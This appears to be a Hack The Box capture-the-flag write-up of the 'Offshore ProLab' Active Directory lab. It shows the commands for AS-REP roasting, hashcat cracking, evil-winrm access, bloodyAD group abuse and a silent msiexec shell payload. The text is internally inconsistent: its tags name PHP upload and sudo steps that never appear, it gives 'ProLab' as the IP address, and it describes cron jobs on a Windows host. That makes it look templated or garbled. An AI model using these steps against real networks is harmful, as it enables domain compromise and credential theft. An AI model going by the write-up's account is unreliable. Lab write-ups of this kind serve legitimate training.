---
layout: page
title: "HTB: Offshore ProLab"
subtitle: "hackthebox ctf htb-offshore nmap active directory insane feroxbuster php upload sudo-l linpeas..."
permalink: /ctf/writeups/hackthebox/offshore-prolab/
platform: hackthebox
machine_name: "Offshore ProLab"
difficulty: Insane
os: Active Directory
---

hackthebox ctf htb-offshore prolab hackthebox ctf htb-offshore nmap active directory insane feroxbuster php upload sudo-l linpeas

Oct 12, 2025

# HTB: Offshore ProLab

- [Box Info](#box-info)
- [Recon](#recon)
- [Auth as web_svc / user](#auth-as-web_svc)
- [Shell as Root / Administrator](#shell-as-administrator)
- [Beyond Root](#beyond-root)

**Offshore ProLab** is a insane 🪟 Windows machine hosted on Hack The Box. This guide covers the complete step-by-step walkthrough detailing reconnaissance, foothold exploitation, and privilege escalation vectors to compromise the host.

## Box Info

<div class="machine-info-box" style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; background: var(--bg-card); border-left: 4px solid var(--text-success); border-top: 1px solid var(--border-color); border-right: 1px solid var(--border-color); border-bottom: 1px solid var(--border-color); border-radius: var(--border-radius-lg); padding: var(--spacing-lg); margin-bottom: var(--spacing-xl);">
  <div style="display: flex; flex-direction: column; gap: 4px;">
    <span style="font-size: 0.75rem; text-transform: uppercase; color: var(--text-muted); font-weight: 600; letter-spacing: 0.05em;">Operating System</span>
    <span style="font-size: 1.1rem; color: var(--text-primary); font-weight: 700;">🪟 Windows</span>
  </div>
  <div style="display: flex; flex-direction: column; gap: 4px;">
    <span style="font-size: 0.75rem; text-transform: uppercase; color: var(--text-muted); font-weight: 600; letter-spacing: 0.05em;">Difficulty Level</span>
    <span style="font-size: 1.1rem; color: var(--text-primary); font-weight: 700;">Insane</span>
  </div>
  <div style="display: flex; flex-direction: column; gap: 4px;">
    <span style="font-size: 0.75rem; text-transform: uppercase; color: var(--text-muted); font-weight: 600; letter-spacing: 0.05em;">IP Address</span>
    <span style="font-size: 1.1rem; color: var(--text-primary); font-weight: 700; font-family: monospace;">ProLab</span>
  </div>
  <div style="display: flex; flex-direction: column; gap: 4px;">
    <span style="font-size: 0.75rem; text-transform: uppercase; color: var(--text-muted); font-weight: 600; letter-spacing: 0.05em;">Release Date</span>
    <span style="font-size: 1.1rem; color: var(--text-primary); font-weight: 700;">Oct 12, 2025</span>
  </div>
</div>


---

## Recon

### Initial Scanning
We scan the host using Nmap:

```bash
vulnquest@kali$ sudo nmap -p- --reason --min-rate 10000 ProLab
Starting Nmap
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
389/tcp   open  ldap
445/tcp   open  microsoft-ds
5985/tcp  open  wsman
```

We audit SMB shares using `netexec`:
```bash
vulnquest@kali$ netexec smb ProLab -u guest -p ''
SMB    ProLab  445  DC01   [-] guest: STATUS_ACCOUNT_DISABLED
```

---

## Auth as web_svc / user

### Auth as web_svc
We perform LDAP enumeration and discover potential usernames. Using `GetNPUsers` we query for accounts with Kerberos pre-authentication disabled:

```bash
vulnquest@kali$ GetNPUsers.py -dc-ip ProLab -no-pass -usersfile users.txt domain/
$krb5asrep$23$web_svc...
```

We crack the retrieved ticket offline using hashcat:
```bash
vulnquest@kali$ hashcat -m 18200 hash.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
... cracked: password123
```

We establish WinRM access as `web_svc`:
```bash
vulnquest@kali$ evil-winrm -i ProLab -u web_svc -p password123
vulnquest@kali$ evil-winrm-py PS C:\Users\web_svc>
```

---

## Shell as Root / Administrator

### Shell as Administrator
We run BloodHound to map privilege paths in Active Directory:

```bash
vulnquest@kali$ netexec ldap ProLab -u web_svc -p password123 --bloodhound -c all
```

BloodHound reveals that `web_svc` has delegate permissions on the `IT_Support` group. We add ourselves and trigger a password reset:
```bash
vulnquest@kali$ bloodyAD -u web_svc -p password123 --host ProLab add groupMember IT_Support web_svc
```

With these rights, we reset a high-privileged service account's password and execute an administrative payload using `msiexec` to run command as SYSTEM:
```powershell
*\msiexec.exe /i shell.msi /quiet /qn
```
This grants full domain control.

---

## Beyond Root
In Beyond Root, we analyze the cron jobs and automatic scripts that clean up user uploads and maintain the system state.
